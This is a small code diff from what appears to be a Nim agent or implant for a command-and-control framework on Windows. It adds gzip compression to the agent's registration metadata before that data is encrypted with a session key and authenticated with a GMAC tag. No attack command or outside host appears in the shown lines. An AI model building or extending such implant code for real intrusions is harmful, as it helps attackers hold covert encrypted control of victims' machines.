@@ -1,4 +1,4 @@
-import winim, os, net, strformat, strutils, registry, sugar
+import winim, os, net, strformat, strutils, registry, zippy
 
 import ../../common/[types, serialize, sequence, crypto, utils]
 
@@ -241,8 +241,11 @@ proc serializeRegistrationData*(ctx: AgentCtx, data: var AgentRegistrationData):
     let metadata = packer.pack()
     packer.reset()
 
+    # Compress payload body
+    let compressedPayload = compress(metadata, BestCompression, dfGzip)
+
     # Encrypt metadata
-    let (encData, gmac) = encrypt(ctx.sessionKey, data.header.iv, metadata, data.header.seqNr)
+    let (encData, gmac) = encrypt(ctx.sessionKey, data.header.iv, compressedPayload, data.header.seqNr)
 
     # Set authentication tag (GMAC)
     data.header.gmac = gmac
